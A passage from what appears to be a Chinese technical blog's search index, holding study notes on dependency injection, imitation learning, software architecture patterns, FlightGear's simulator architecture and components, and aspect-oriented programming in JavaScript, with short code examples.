    <content type="text"><![CDATA[依赖注入定义在软件工程中，依赖注入是种实现控制反转用于解决依赖性设计模式。一个依赖关系指的是可被利用的一种对象（即服务提供端） 。依赖注入是将所依赖的传递给将使用的从属对象（即客户端）。该服务是将会变成客户端的状态的一部分。 传递服务给客户端，而非允许客户端来建立或寻找服务，是本设计模式的基本要求。 依赖注入意义依赖存在的问题如果在 Class A 中，有 Class B 的实例，则称 Class A 对 Class B 有一个依赖。例如下面类 Human 中用到一个 Father 对象，我们就说类 Human 对类 Father 有一个依赖。 12345678public class Human &#123; ... Father father; ... public Human() &#123; father = new Father(); &#125;&#125; 仔细看这段代码我们会发现存在一些问题： 如果现在要改变 father 生成方式，如需要用new Father(String name)初始化 father，需要修改 Human 代码； 如果想测试不同 Father 对象对 Human 的影响很困难，因为 father 的初始化被写死在了 Human 的构造函数中； 如果new Father()过程非常缓慢，单测时我们希望用已经初始化好的 father 对象 Mock 掉这个过程也很困难。 依赖注入的好处上面将依赖在构造函数中直接初始化是一种 Hard init 方式，弊端在于两个类不够独立，不方便测试。我们还有另外一种 Init 方式，如下：12345678public class Human &#123; ... Father father; ... public Human(Father father) &#123; this.father = father; &#125;&#125; 上面代码中，我们将 father 对象作为构造函数的一个参数传入。在调用 Human 的构造方法之前外部就已经初始化好了 Father 对象。像这种非自己主动初始化依赖，而通过外部来传入依赖的方式，我们就称为依赖注入。 现在我们发现上面 1 中存在的两个问题都很好解决了，简单的说依赖注入主要有两个好处： 解耦，将依赖之间解耦。 因为已经解耦，所以方便做单元测试，尤其是 Mock 测试。 依赖注入实现Java中的依赖注入依赖注入的实现有多种途径，而在 Java 中，使用注解是最常用的。通过在字段的声明前添加 @Inject 注解进行标记，来实现依赖对象的自动注入。 1234567public class Human &#123; ... @Inject Father father; ... public Human() &#123; &#125;&#125; 上面这段代码看起来很神奇：只是增加了一个注解，Father 对象就能自动注入了？这个注入过程是怎么完成的？ 实质上，如果你只是写了一个 @Inject 注解，Father 并不会被自动注入。你还需要使用一个依赖注入框架，并进行简单的配置。现在 Java 语言中较流行的依赖注入框架有 Google Guice、Spring 等，而在 Android 上比较流行的有 RoboGuice、Dagger 等。 PHP中的依赖注入12345678910111213141516class Application&#123; function __construct(Auth $auth, Session $session) &#123; $this-&gt;auth = $auth; $this-&gt;session = $session; &#125; // ... 程式 ...&#125;$auth = new Auth(&apos;localhost&apos;, &apos;root&apos;, &apos;&apos;);$session = new Session();$application = new Application($auth, $session);$application-&gt;login(&apos;admin&apos;, &apos;admin&apos;); 参考链接 依赖注入,by wikipedia. 依赖注入,by android-cn.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模仿学习研究笔记]]></title>
    <url>%2F2019%2F01%2F26%2F%E6%A8%A1%E4%BB%BF%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[模仿学习定义模仿学习是指从示教者提供的范例中学习，一般提供人类专家的决策数据 \{ \tau_1,\tau_2,\ldots,\tau_m \}，每个决策包含状态和动作序列 \tau_i = ，将所有「状态-动作对」抽取出来构造新的集合 \mathcal{D}=\{ (s_1,a_1),(s_2,a_2),(s_3,a_3),\ldots \}。之后就可以把状态作为特征（feature），动作作为标记（label）进行分类（对于离散动作）或回归（对于连续动作）的学习从而得到最优策略模型。模型的训练目标是使模型生成的状态-动作轨迹分布和输入的轨迹分布相匹配。 模仿学习意义在传统的强化学习任务中，通常通过计算累积奖赏来学习最优策略（policy），这种方式简单直接，而且在可以获得较多训练数据的情况下有较好的表现。然而在多步决策（sequential decision）中，学习器不能频繁地得到奖励，且这种基于累积奖赏及学习方式存在非常巨大的搜索空间。而模仿学习（Imitation Learning）的方法经过多年的发展，已经能够很好地解决多步决策问题，在机器人、 NLP 等领域也有很多的应用。 模仿学习实现当前主要以下几种方法实现模型学习： 行为克隆（Behavior Cloning）行为克隆（Behavior Cloning）根据人类提供的状态动作对来习得策略，是作为监督学习的模仿学习。 逆强化学习（Inverse Reinforcement Learning ）IRL 是 反过来的 RL，RL 是根据 reward 进行参数的调整，然后得到一个 policy。 但是， IRL 就不同了，因为他没有显示的 reward，只能根据 人类行为，进行 reward的估计（反推 reward 的函数）。在得到 reward 函数估计出来之后，再进行 策略函数的估计。 逆强化学习是在给定一个专家之后（expert policy），通过不断地寻找 reward function 来满足给定的 statement（即，解释专家的行为，explaining expert behavior）。 结构化预测（Structured prediction）在机器学习过程中，对数据的拟合其实就是在找一个拟合函数f，比如对于回归问题（Regression）来说，这个函数输出一个标量（scalar），对于分类问题（Classification）来说，这个函数输出一个类别（一个one-hot的向量），但是有一类的预测，它并不是输出一个标量或者一个类别，而是输出些有结构的输出，比如，一个序列，一个句子，一个图，一颗树。 生成对抗网络（GAN for Imitation Learning）那么如何用 GAN 来做这个事情呢？对应到这件事情上，我们知道，我们想得到的 轨迹 是属于某一个高维的空间中，而 expert 给定的那些轨迹，我们假设是属于一个 distribution，我们想让我们的 model，也去 predict 一个分布出来，然后使得这两者之间尽可能的接近。从而完成 actor 的训练过程。 参考链接 模仿学习（Imitation Learning）完全介绍（一）,by 我勒个矗. 深度强化学习之：模仿学习（imitation learning）,by wangxiaocvpr. 机器人学习Robot Learning之模仿学习Imitation Learning的发展,by c2a2o2. 行为克隆,by XINGYES. 最前沿：用模仿学习来学习增强学习,by Flood Sung. 机器人学习最前沿：一眼模仿学习（One-Shot Imitation Learning）的三级跳,by Flood Sung. 深度学习课程笔记（七）：模仿学习（imitation learning）,by WangXiao.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件架构的一些思考]]></title>
    <url>%2F2019%2F01%2F25%2F%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[以前对软件架构总是雾里看花，似懂非懂，最近好像有点悟了，赶紧记录一下。 软件架构的定义（What）软件架构是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计[1]。 软件体系结构是构建计算机软件实践的基础。与建筑师设定建筑项目的设计原则和目标，作为绘图员画图的基础一样，软件架构师或者系统架构师陈述软件架构以作为满足不同客户需求的实际系统设计方案的基础。从和目的、主题、材料和结构的联系上来说，软件架构可以和建筑物的架构相比拟。一个软件架构师需要有广泛的软件理论知识和相应的经验来实施和管理软件产品的高级设计。软件架构师定义和设计软件的模块化，模块之间的交互，用户界面风格，对外接口方法，创新的设计特性，以及高层事物的对象操作、逻辑和流程。 软件架构的意义（Why）软件架构是一个系统的草图。软件架构描述的对象是直接构成系统的抽象组件。各个组件之间的连接则明确和相对细致地描述组件之间的通讯。在实现阶段，这些抽象组件被细化为实际的组件，比如具体某个类或者对象。在面向对象领域中，组件之间的连接通常用接口来实现。 软件架构是软件架构师与项目干系人沟通的工具。例如：软件架构师与客户商谈概念上的事情，与经理商谈广泛的设计问题，与软件工程师商谈创新的结构特性，与程序员商谈实现技巧，外观和风格。 软件架构的选择（How）用户需求决定软件架构的选择。用户需求可分成功能性需求和非功能性需求。功能性需求即用户要求软件产品应实现什么样的功能，非功能性需求即用户要求软件产品的质量属性达到一定标准。以开发一个购物网站为例，用户要求实现商品展示功能、购物车功能即功能性需求，用户要求在1秒内打开购物网站、网站平均无故障时间是一个月即非功能性需求。通常用户的非功能性需求对软件架构产生决定性影响。 常见的软件架构分层架构分层架构（layered architecture）是最常见的软件架构，也是事实上的标准架构。如果你不知道要用什么架构，那就用它。 这种架构将软件分成若干个水平层，每一层都有清晰的角色和分工，不需要知道其他层的细节。层与层之间通过接口通信。 虽然没有明确约定，软件一定要分成多少层，但是四层的结构最常见: 表现层（presentation）：用户界面，负责视觉和用户互动 业务层（business）：实现业务逻辑 持久层（persistence）：提供数据，SQL 语句就放在这一层 数据库（database） ：保存数据 事件驱动架构事件（event）是状态发生变化时，软件发出的通知。 事件驱动架构（event-driven architecture）就是通过事件进行通信的软件架构。它分成四个部分。 事件队列（event queue）：接收事件的入口 分发器（event mediator）：将不同的事件分发到不同的业务逻辑单元 事件通道（event channel）：分发器与处理器之间的联系渠道 事件处理器（event processor）：实现业务逻辑，处理完成后会发出事件，触发下一步操作 微核架构微核架构（microkernel architecture）又称为”插件架构”（plug-in architecture），指的是软件的内核相对较小，主要功能和业务逻辑都通过插件实现。 内核（core）通常只包含系统运行的最小功能。插件则是互相独立的，插件之间的通信，应该减少到最低，避免出现互相依赖的问题。 微服务架构微服务架构（microservices architecture）是服务导向架构（service-oriented architecture，缩写 SOA）的升级。 每一个服务就是一个独立的部署单元（separately deployed unit）。这些单元都是分布式的，互相解耦，通过远程通信协议（比如REST、SOAP）联系。 微服务架构分成三种实现模式。 RESTful API 模式：服务通过 API 提供，云服务就属于这一类 RESTful 应用模式：服务通过传统的网络协议或者应用协议提供，背后通常是一个多功能的应用程序，常见于企业内部 集中消息模式：采用消息代理（message broker），可以实现消息队列、负载均衡、统一日志和异常处理，缺点是会出现单点失败，消息代理可能要做成集群 云架构云结构（cloud architecture）主要解决扩展性和并发的问题，是最容易扩展的架构。 它的高扩展性，主要原因是没使用中央数据库，而是把数据都复制到内存中，变成可复制的内存数据单元。然后，业务处理能力封装成一个个处理单元（prcessing unit）。访问量增加，就新建处理单元；访问量减少，就关闭处理单元。由于没有中央数据库，所以扩展性的最大瓶颈消失了。由于每个处理单元的数据都在内存里，最好要进行数据持久化。 这个模式主要分成两部分：处理单元（processing unit）和虚拟中间件（virtualized middleware）。 处理单元：实现业务逻辑 虚拟中间件：负责通信、保持sessions、数据复制、分布式处理、处理单元的部署。 虚拟中间件又包含四个组件。 消息中间件（Messaging Grid）：管理用户请求和session，当一个请求进来以后，决定分配给哪一个处理单元。 数据中间件（Data Grid）：将数据复制到每一个处理单元，即数据同步。保证某个处理单元都得到同样的数据。 处理中间件（Processing Grid）：可选，如果一个请求涉及不同类型的处理单元，该中间件负责协调处理单元 部署中间件（Deployment Manager）：负责处理单元的启动和关闭，监控负载和响应时间，当负载增加，就新启动处理单元，负载减少，就关闭处理单元。 客户端/服务器架构这种架构由两部分组成：一个服务器和多个客户端。服务器组件将为多个客户端组件提供服务。客户端从服务器请求服务，服务器为这些客户端提供相关服务。此外，服务器持续侦听客户机请求。 模型/视图/控制器架构这种架构，也称为MVC模式，把一个交互式应用程序划分为3个部分， 模型：包含核心功能和数据 视图：将信息显示给用户(可以定义多个视图) 控制器：处理用户输入的信息 这样做是为了将信息的内部表示与信息的呈现方式分离开来，并接受用户的请求。它分离了组件，并允许有效的代码重用。 参考文献 软件架构,by wikipedia. 软件架构入门,by 阮一峰. 10种常见的软件架构模式,by 尽信书不如无书. MVC,by wikipedia. 1.软件架构编年史(译),by qinyu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear技术分析]]></title>
    <url>%2F2019%2F01%2F24%2FFlightGear%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[FlightGear是一个始于1997年多平台飞行模拟器、开源软件项目[1]。该项目适用的操作系统主要包括Linux、Microsoft Windows和Mac OS X，采用C++编写。 FlightGear体系结构当前体系结构FlightGear体系结构基于一个名为“主循环”的无限循环[2]。其流程图如图1所示。在主循环中将依次完成如下工作: ATC模拟 控制AI对象 在多用户环境中更新其他飞机 飞行动力学计算 风景更新 音频调度 渲染 图1 FlightGear主循环流程图 高级体系结构FlightGear正在支持高级体系结构(High Level Architecture, HLA)[3][4]。 HLA简介高级体系结构（HLA）是分布式仿真的标准，用于通过组合（联合）多个仿真来构建用于更大目的的仿真。该标准是在美国国防部的领导下于90年代开发的，后来转变为开放的国际IEEE标准。它是北约通过STANAG 4603推荐的标准。今天，HLA被用于许多领域，包括国防和安全以及民用应用。该体系结构指定以下组件： 运行时基础结构（RTI），通过不同的编程语言提供标准化的服务集。这些服务包括信息交换，同步和联合管理 联邦成员（Federates）是使用RTI服务的单独仿真系统，由多个联邦成员对象构成。 联邦成员对象模型（FOM），指定用于交换数据的对象类和交互类。 FOM可以描述任何域的信息。 图2 HLA构成 HLA标准由三部分组成： IEEE Std 1516-2010框架和规则，它规定了组件或整个联合应遵守的十个体系结构规则。 IEEE Std 1516.1-2010联邦接口规范，规定了RTI应提供的服务。这些服务以C ++和Java API以及Web服务的形式提供。 IEEE Std 1516.2-2010对象模型模板规范，它规定了HLA对象模型（如FOM）应使用的格式。 HLA优势与单机仿真相比，这有三大优势[5]（例如FlightGear V3.6）： 它提供了一个强大的环境，使模拟器具有多线程，利用具有多个内核的计算机，或者在不同的计算机（甚至包括不同的平台和操作系统）上运行模拟的不同部分。 它允许我们分离模拟器的部分，如AI（通过解耦AI交通系统）、FDM、Nasal脚本和渲染器，以及较少时间关键的子系统，如天气，这样我们就可以获得一致（也许更高）的帧速率（即减少Nasal垃圾收集对帧速率的影响）。 它提供了一个非常好的框架，允许任何人使用除C / C ++之外的编程语言（想想Ada，Java，Python等）创建与FlightGear交互的组件，这些编程语言可能在他们自己的线程中运行，并且驻留在单独的二进制文件中，这也更容易调试/排除故障（想想回归测试，即在专用的gdb / valgrind会话中运行一个自包含的子系统），而不必知道如何修改/补丁和重建FlightGear。 FlightGear组件构成FlightGear由很多开源组件或程序构成[6]，具体包括： RTIRTI是HLA架构的关键组件，相当于中间件。 OpenRTIOpenRTI是一个包含了rti 1.3、rti 1516、rti 1516e标准接口实现的rti库。OpenRTI有如下关键特性： 易用性高，非常便于使用； 直接提供C++调用接口，也可以提供Java接口，但目前还没有编码实现； 可扩展性强； 一直在维护中的RTI开源项目； 树状的服务器结构； 最短路径在内存中不拷贝数据； 不依赖其它项目，仅仅需要C++编译器，特别的不需要boost； 支持线程间通信、rti通信和管道间通信，未来可能支持http通信； 到处都可以运行，能够在Linux、Win32、MacOS和Solaris上运行。 FDM飞行动力学模型（Flight Dynamics Model, FDM）是模拟器内控制飞机物理飞行的数学模型。飞机的3D模型实质是一张图片，其与飞行动力学无关，本质上由FDM控制飞机如何飞行。在FlightGear中主要使用JSBSim和YASim两个飞行动力学模型。 JSBSimJSBSim是一个用C++实现的开源跨平台飞行器动力学模型软件。Flightgear也采用了JSBSim作为其中的飞行器动力模型之一。同时JSBSim也可以作为一个单独的动力学模型软件进行运行。 YASimYASim使用飞机的几何形状生成基本飞行特征。虽然这表明了一种“现实的”或开箱即用的方法，但在获得接近现实主义的结果之前，这只是一种粗略的近似，需要进行大量的调整。如果您的飞机有稳定的飞行数据，例如风洞数据，或者您希望最终生成超逼真的模拟，那么JSBSim可能是更好的方法。 如果你缺乏这样的数据但是知道飞机的几何形状并且能够获得与真实飞行员相同的飞行特性和限制，那么YASim可以提供足以满足大多数模拟需求的解决方案。 AtlasAtlas旨在为FlightGear（一种开源飞行模拟器）的用户制作和展示世界高质量的图表。 这是通过两个主要部分实现的：地图创建者（简称为Map）和Atlas查看器。 地图创建者从FlightGear获取风景数据并将其转换为漂亮的地图图片，可以使用您可能已安装的任何位图图像程序或使用Atlas查看应用程序查看。 Atlas查看应用程序可用于浏览您的地图，但也可以直接连接到FlightGear，并在所谓的移动地图显示上显示您的飞机当前位置。 FlightGear Multiplayer ServerFGMS或FlightGear多人游戏服务器是FlightGear的独立网络服务器，并根据GPL许可。它允许通过FGFS内的网络与其他飞行员一起飞行。 可以在服务器配置中配置的服务器列表类型： 中继服务器 - 网络中的其他服务器。 每个都必须有完整的列表（减去自己）以获得适当的网络功能。 交叉馈送服务器 - 服务器从本地用户和其他服务器接收的所有内容都将转发到交叉馈送服务器。 用于在同一主机上运行多个连接的fgms实例，例如 用于提供跟踪和未跟踪服务，而不会产生额外的外部流量。 跟踪器 - 服务器每10秒向跟踪器发送一个每个本地用户的摘要更新。 HUB - 通常服务器不会将从服务器接收的数据包发送到其他中继。 HUB服务器将数据从服务器发送到它知道的所有中继。 FGCOMFGCom是一种语音通信功能。这样您就可以在飞行途中与其他飞行员和空域管制员进行通信。 主要思想是重现真实的航空通信，换句话说，此功能旨在使您的航班期间尽可能真实地进行无线电通信。 FGCom有两种方式： 集成到FlightGear（FGCom内置）：这当然是更好的解决方案，因为更容易使用外部软件（FGCom standalone）：只有在计划在特殊情况下使用FGCom时才应使用此软件 MPmapMPMap是一个实用程序，可以在世界地图上显示在FlightGear世界中飞行的飞机。 除此之外，它还提供对导航数据的访问，例如ILS频率，跑道号和修正。由于它使用谷歌地图，人们可以选择地图或卫星视图。 SimGearSimGear是FlightGear使用的一组开源软件库。该项目仍在开发中，但其目标是成为“仿真内核”，并由其他非FlightGear项目使用。该项目于2000年启动。SimGear与FlightGear和TerraGear一样，需要PLIB进行构建。 SimGear是一个仿真架构工具集(simulation construction tools)，是FlightGear的仿真引擎，完成了数据结构操作、星历计算、模拟天空、坐标系转换等大部分的工作，它也是一个开源库。 PLibPLIB（便携式游戏库）是由Steve J. Baker编写的一套用于编写游戏的软件库。 FlightGear在其大部分开发中使用了PLIB。 它也被FlightGear相关程序Atlas使用。 PLIB是开源的，并且是在GNU Library General Public License下发布的。 FlightGear 1.0（2007年发布）是在向OpenSceneGraph（OSG）过渡之前使用PLIB进行3D场景图的最后一次公开发布。 FlightGear仍然使用PLIB执行各种任务; 例如，读取操纵杆输入并显示图形用户界面（GUI）。 在后一种用法中，PLIB的PUI组件最终将由Canvas和Phi在FlightGear中替换，这将极大地改善当前GUI的功能，超出PUI提供的功能。 构建FlightGear时需要PLIB。 OSGOSG是OpenSceneGraph的缩写，OpenSceneGraph图形系统是一个基于工业标准OpenGL的软件接口，它让程序员能够更加快速、便捷地创建高性能、跨平台的交互式图形程序。相比于工业标准OpenGL或者其他图形库，OpenSceneGraph的优点明显，除了程序开源和平台无关性以外，其封装并提供了数量众多的提升程序运行时性能的算法、针对包括分页数据库在内的几乎所有的主流数据格式的直接数据接口、 以及针对脚本语言系统Pthyon和Tcl的支持。 OpenGL是Open Graphics Library的缩写，其独立于硬件，独立于窗口系统，在运行各种操作系统的各种计算机上都可用，并能在网络环境下以客户/服务器模式工作，是专业图形处理、科学计算等高端应用领域的标准图形库。 场景相关工具TerraSync要查看飞机下方的地形，您必须安装相应的风景。这可以通过在安装风景的文章中描述的在飞行之前下载某些景点来实现。 或者，如果您有稳定且相当快速的互联网连接，则可以使用TerraSync。它是一个实用程序，可在模拟器运行时自动下载所需FlightGear场景的最新版本。 TerraSync在后台运行（可选择作为单独的进程），监视您的位置，并从“主时间”服务器“及时”下载（或更新）最新的场景。一段时间以来，TerraSync已经集成到核心FlightGear流程中，因此不需要为典型用户处理TerraSync。 TerraSync的主存储库，即TerraSync从中下载文件的在线资源，每天与FlightGear Scenery数据库同步一次。因此，当使用TerraSync时，您将永远拥有 最新的.stg文件，告诉FlightGear放置对象的位置 最新的对象静态模型。 （静态模型定义仅存在于一个地方的唯一对象，例如着名的建筑物或地标。） 最新的对象共享模型。 （通用模型在不同的地方使用不止一次，每个都可以代表许多不同的对象，如通用房屋或船舶） TerrGearTerraGear是开源工具和渲染库的集合，可以在地球的3D表示（即3D模型或3D地图）中转换公开可用的GIS数据，以用于实时渲染项目。 TerraGear可以导入3D数据集，例如DEM地形网格，2D多边形数据集（如海岸线，城市轮廓，湖泊轮廓）和2D栅格数据集，例如1 km NAOO土地利用/土地覆盖数据。它还具有基于可用的FAA数据生成逼真的机场，跑道和照明的工具。 TerraGear是用于为FlightGear项目生成场景的主要工具。 如果没有terragear，可以更改Terrain纹理，但不能更改地形。如果要更改城市的纹理，请更改材质文件。如果你想改变海岸线，你需要terragear。检查目录FGDATA/Material中的材料文件，你需要terragear。 参考链接 FlightGear,by wikipedia. A NEW ARCHITECTURE FOR FLIGHTGEAR FLIGHT SIMULATOR,by flightgear. FlightGear high-level architecture support,by flightgear Developing with HLA,by flightgear. High-Level Architecture,by flightgear. High-level architecture,by wikipedia. FlightGear related projects,by wikipedia. OpenRTI,by openrti. JSBSim,by wikipedia. YASim,by flightgear. JSBSim vs YASim,by flightgear. Atlas,by atlas. FGCom 3.0,by wikipedia. FlightGear Multiplayer Server,by flightgear. SimGear,by flightgear. PLIB,by flightgear. OSG,by flightgear. Flightgear操作方式以及几种典型飞机的起飞方法,by Mosquito_蚊子.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面向方面编程简介]]></title>
    <url>%2F2019%2F01%2F23%2F%E9%9D%A2%E5%90%91%E6%96%B9%E9%9D%A2%E7%BC%96%E7%A8%8B%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[什么是面向方面编程(What)面向侧面的程序设计（aspect-oriented programming，AOP，又译作面向方面的程序设计、观点导向编程、剖面导向程序设计）是计算机科学中的一个术语，指一种程序设计范型。该范型以一种称为侧面（aspect，又译作方面）的语言构造为基础，侧面是一种新的模块化机制，用来描述分散在对象、类或函数中的横切关注点（crosscutting concern）。 侧面的概念源于对面向对象的程序设计的改进，但并不只限于此，它还可以用来改进传统的函数。与侧面相关的编程概念还包括元对象协议、主题（subject）、混入（mixin）和委托。 基本概念 关注点（concern）：对软件工程有意义的小的、可管理的、可描述的软件组成部分，一个关注点通常只同一个特定概念或目标相关联。 主关注点（core concern）：一个软件最主要的关注点。 关注点分离（separation of concerns，SOC）：标识、封装和操纵只与特定概念、目标相关联的软件组成部分的能力，即标识、封装和操纵关注点的能力。 方法（method）：用来描述、设计、实现一个给定关注点的软件构造单位。 横切（crosscut）：两个关注点相互横切，如果实现它们的方法存在交集。 支配性分解（dominant decomposition）：将软件分解成模块的主要方式。传统的程序设计语言是以一种线性的文本来描述软件的，只采用一种方式（比如：类）将软件分解成模块；这导致某些关注点比较好的被捕捉，容易进一步组合、扩展；但还有一些关注点没有被捕捉，弥散在整个软件内部。支配性分解一般是按主关注点进行模块分解的。 横切关注点（crosscutting concerns）：在传统的程序设计语言中，除了主关注点可以被支配性分解方式捕捉以外，还有许多没有被支配性分解方式捕捉到的关注点，这些关注点的实现会弥散在整个软件内部，这时这些关注点同主关注点是横切的。 侧面（aspect）：在支配性分解的基础上，提供的一种辅助的模块化机制，这种新的模块化机制可以捕捉横切关注点。 从主关注点中分离出横切关注点是面向侧面的程序设计的核心概念。分离关注点使得解决特定领域问题的代码从业务逻辑中独立出来，业务逻辑的代码中不再含有针对特定领域问题代码的调用，业务逻辑同特定领域问题的关系通过侧面来封装、维护，这样原本分散在在整个应用程序中的变动就可以很好的管理起来。 对于一个信用卡应用程序来说，存款、取款、帐单管理是它的主关注点，日志和持久化将成为横切整个对象结构的横切关注点。 为什么需要面向方面编程(Why)AOP技术的优势是显而易见的。在面向对象的世界里，人们提出了各种方法和设计原则来保障系统的可复用性与可扩展性，以期建立一个松散耦合、便于扩展的软件系统。例如GOF提出的“设计模式”，为我们提供了设计的典范与准则。设计模式通过最大程度的利用面向对象的特性，诸如利用继承、多态，对责任进行分离、对依赖进行倒置，面向抽象，面向接口，最终设计出灵活、可扩展、可重用的类库、组件，乃至于整个系统的架构。在设计的过程中，通过各种模式体现对象的行为、暴露的接口、对象间关系、以及对象分别在不同层次中表现出来的形态。然而鉴于对象封装的特殊性，“设计模式”的触角始终在接口与抽象中大做文章，而对于对象内部则无能为力。 通过“横切”技术，AOP技术就能深入到对象内部翻云覆雨，截取方法之间传递的消息为我所用。由于将核心关注点与横切关注点完全隔离，使得我们能够独立的对“方面”编程。它允许开发者动态地修改静态的OO模型，构造出一个能够不断增长以满足新增需求的系统，就象现实世界中的对象会在其生命周期中不断改变自身，应用程序也可以在发展中拥有新的功能。 设计软件系统时应用AOP技术，其优势在于： 在定义应用程序对某种服务（例如日志）的所有需求的时候。通过识别关注点，使得该服务能够被更好的定义，更好的被编写代码，并获得更多的功能。这种方式还能够处理在代码涉及到多个功能的时候所出现的问题，例如改变某一个功能可能会影响到其它的功能，在AOP中把这样的麻烦称之为“纠结（tangling）”。 利用AOP技术对离散的方面进行的分析将有助于为开发团队指定一位精于该项工作的专家。负责这项工作的最佳人选将可以有效利用自己的相关技能和经验。 持久性。标准的面向对象的项目开发中，不同的开发人员通常会为某项服务编写相同的代码，例如日志记录。随后他们会在自己的实施中分别对日志进行处理以满足不同单个对象的需求。而通过创建一段单独的代码片段，AOP提供了解决这一问题的持久简单的方案，这一方案强调了未来功能的重用性和易维护性：不需要在整个应用程序中一遍遍重新编写日志代码，AOP使得仅仅编写日志方面（logging aspect）成为可能，并且可以在这之上为整个应用程序提供新的功能。 总而言之，AOP技术的优势使得需要编写的代码量大大缩减，节省了时间，控制了开发成本。同时也使得开发人员可以集中关注于系统的核心商业逻辑。此外，它更利于创建松散耦合、可复用与可扩展的大型软件系统。 如何实现面向方面编程(How)使用js实现before（前置通知）、after（后置通知）、around（环绕通知）。 before（前置通知）before函数，用来实现函数的前置通知。在目标函数的前面执行一些前置操作。1234567891011121314151617181920212223242526272829// AOP 前置通知函数声明/** * 给方法加入前置切片函数 * 可以在执行方法之前执行一些操作, * 前置切片的返回值为false时，不影响原方法的执行 * @param func &#123;Function&#125; 被前置执行的函数 * @return &#123;Function&#125; 加入前置通知的函数 */Function.prototype._before = function(func)&#123; var __self = this; return function()&#123; func.apply(__self, arguments); return __self.apply(__self, arguments); &#125;&#125;// 代码function a()&#123; console.log(&apos;I\&apos;m a&apos;);&#125;a = a._before(function()&#123; console.log(&apos;before&apos;);&#125;);a();// 结果：// before// I&apos;m a after（后置通知）after函数，用来实现函数的后置通知。在目标函数的后面面执行一些后置操作。 12345678910111213141516171819202122232425262728293031// AOP 后置通知函数声明/** * 给方法加入后置切片函数 * 可以在执行方法之之后执行一些操作 * 后置切片的返回值为false时，不影响原方法的执行 * @param func &#123;Function&#125; 被后置执行的函数 * @return &#123;Function&#125; 加入后置通知的函数 * @constructor */Function.prototype._after = function(func)&#123; var __self = this; return function()&#123; var ret = __self.apply(__self, arguments); func.apply(__self, arguments); return ret; &#125;&#125;// 代码function b()&#123; console.log(&apos;I\&apos;m b&apos;);&#125;b = b._after(function()&#123; console.log(&apos;after&apos;);&#125;);b();// 结果：// I&apos;m b// after around（环绕通知）在around函数中，引入了一个JoinPoint对象。JoinPoint对象封装了目标函数和目标函数的参数。在调用JoinPoint对象的invoke函数时，会去调用原来的目标函数。在调用invoke时，如果需要改变目标函数的this对象，需要将对象传入到invoke的参数中。around函数，可以在目标函数的前面和后面随意加入逻辑代码，也可以根据条件判断是否执行目标函数。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// AOP 环绕通知函数声明/** * 切入点对象 * 不允许切入对象多次调用 * @param obj 对象 * @param args 参数 * @constructor */function JoinPoint(obj, args)&#123; var isapply = false; // 判断是否执行过目标函数 var result = null; // 保存目标函数的执行结果 this.source = obj; // 目标函数对象 this.args = args; // 目标函数对象传入的参数 /** * 目标函数的代理执行函数 * 如果被调用过，不能重复调用 * @return &#123;object&#125; 目标函数的返回结果 */ this.invoke = function(thiz)&#123; if(isapply)&#123; return; &#125; isapply = true; result = this.source.apply(thiz || this.source, this.args); return result; &#125;; // 获取目标函数执行结果 this.getResult = function()&#123; return result; &#125;&#125;/** * 方法环绕通知 * 原方法的执行需在环绕通知方法中执行 * @param func &#123;Function&#125; 环绕通知的函数 * 程序会往func中传入一个JoinPoint(切入点)对象, 在适当的时机 * 执行JoinPoint对象的invoke函数，调用目标函数 * * @return &#123;Function&#125; 切入环绕通知后的函数， */Function.prototype._around = function(func)&#123; var __self = this; return function()&#123; var args = [new JoinPoint(__self, arguments)]; return func.apply(this, args); &#125;&#125;// 代码var isAdmin = true;function c()&#123; console.log(&apos;show user list&apos;);&#125;c = c._around(function(joinpoint)&#123; if(isAdmin)&#123; // 满足条件时，执行目标函数 console.log(&apos;is admin&apos;); joinpoint.invoke(this); &#125;&#125;);c();// 结果// if isAdmin == true// is admin// show user list// if isAdmin == false 参考链接 面向侧面的程序设计,by wikipedia. 什么是面向切面编程AOP？,by 知乎. 什么是面向方面编程,by liuweitoo. AOP面向方面编程,by 规速. 团队开发框架实战—面向切面的编程 AOP,by Bobby0322. 轻松理解AOP(面向切面编程),by -望远-. AOP在JS中的实现及应用,by _Sirius.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何写好一篇论文的十条基本原则]]></title>
    <url>%2F2019%2F01%2F17%2F%E5%A6%82%E4%BD%95%E5%86%99%E5%A5%BD%E4%B8%80%E7%AF%87%E8%AE%BA%E6%96%87%E7%9A%84%E5%8D%81%E6%9D%A1%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99%2F</url>
